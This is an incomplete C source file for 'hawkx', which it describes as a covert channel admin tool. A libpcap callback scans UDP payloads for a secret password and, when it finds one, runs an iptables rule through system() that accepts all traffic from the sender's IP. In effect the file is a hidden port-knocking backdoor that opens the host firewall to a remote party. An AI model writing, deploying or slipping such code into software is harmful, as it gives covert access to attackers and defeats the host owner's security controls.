
/* Ethernet addresses are 6 bytes */
#define ETHER_ADDR_LEN	6

/* ethernet headers are always exactly 14 bytes [1] */
#define SIZE_ETHERNET 14

/* default snap length (maximum bytes per packet to capture) */
#define SNAP_LEN 1518


/* Ethernet header */
struct sniff_ethernet {
        u_char  ether_dhost[ETHER_ADDR_LEN];    /* destination host address */
        u_char  ether_shost[ETHER_ADDR_LEN];    /* source host address */
        u_short ether_type;                     /* IP? ARP? RARP? etc */
};


/* IP header */
struct sniff_ip {
        u_char  ip_vhl;                 /* version << 4 | header length >> 2 */
        u_char  ip_tos;                 /* type of service */
        u_short ip_len;                 /* total length */
        u_short ip_id;                  /* identification */
        u_short ip_off;                 /* fragment offset field */
        #define IP_RF 0x8000            /* reserved fragment flag */
        #define IP_DF 0x4000            /* dont fragment flag */
        #define IP_MF 0x2000            /* more fragments flag */
        #define IP_OFFMASK 0x1fff       /* mask for fragmenting bits */
        u_char  ip_ttl;                 /* time to live */
        u_char  ip_p;                   /* protocol */
        u_short ip_sum;                 /* checksum */
        struct  in_addr ip_src,ip_dst;  /* source and dest address */
};
#define IP_HL(ip)               (((ip)->ip_vhl) & 0x0f)
#define IP_V(ip)                (((ip)->ip_vhl) >> 4)


/* UDP header */
struct sniff_udp {
         u_short uh_sport;               /* source port */
         u_short uh_dport;               /* destination port */
         u_short uh_ulen;                /* udp length */
         u_short uh_sum;                 /* udp checksum */

};

#define SIZE_UDP        8               /* length of UDP header */	








usage()
{
  printf("hawkx Version %s\n", HAWKX_VERSION);
  printf(" Simple Covert Channel Admin Tool\n");
  /*printf(" (/)\n");*/

  printf("Usage:\n");
  printf("./hawkx <interface>\n");

}


void processPacket(u_char *arg, const struct pcap_pkthdr* pkthdr, const u_char * packet) {

	
	/* declare pointers to packet headers */
	const struct sniff_ethernet *ethernet;  /* The ethernet header [1] */
	const struct sniff_ip *ip;              /* The IP header */
	const struct sniff_tcp *tcp;            /* The TCP header */
	const struct sniff_udp *udp;		/* The UDP header */
	const char *payload;                    /* Packet payload */

	int size_ip;
	int size_tcp;
	int size_udp;
	int size_payload;	

	/* define ethernet header */
	ethernet = (struct sniff_ethernet*)(packet);
	
	/* define/compute ip header offset */
	ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
	size_ip = IP_HL(ip)*4;
	if (size_ip < 20) {
		//printf("   * Invalid IP header length: %u bytes\n", size_ip);
		return;
	}


if ( ip->ip_p == IPPROTO_UDP)
{
	printf("UDP PACKET\n");
	/*

	 *  OK, this packet is UDP.
	 */
	//printf("in UDP Processing\n");

	/* define/compute ucp header offset */
	udp = (struct sniff_udp*)(packet + SIZE_ETHERNET + size_ip);
	size_udp = SIZE_UDP;

	/* define/compute udp payload (segment) offset */
	payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_udp);
	
	/* compute udp payload (segment) size */
	size_payload = ntohs(ip->ip_len) - (size_ip + size_udp);
	
	

		if( strstr( payload, PASSWORD ) )
		{

			char command[255];
			memset( &command, '\0', 255);
			
			// allow all tcp ports from 
			strcat( command, "iptables -I INPUT -s ");
			strcat( command, inet_ntoa(ip->ip_src) );
			strcat( command, " -j ACCEPT");

			printf("SRC IP: %s\n", inet_ntoa(ip->ip_src));
			//printf("command: %s\n", command);
			system( command);

		  }



 }



return;

}



